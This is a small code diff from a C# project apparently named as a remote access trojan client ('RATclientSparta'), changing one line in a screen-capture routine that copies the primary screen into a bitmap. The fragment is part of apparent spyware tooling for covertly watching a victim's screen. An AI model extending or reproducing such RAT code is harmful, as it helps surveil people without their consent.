@@ -74,7 +74,7 @@ namespace RATclientSparta.Tools.ScreenShare
 
         public Bitmap CaptureScreen()
         {
-            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+            Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
             Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
 
             using (Graphics graphics = Graphics.FromImage(screenshot))
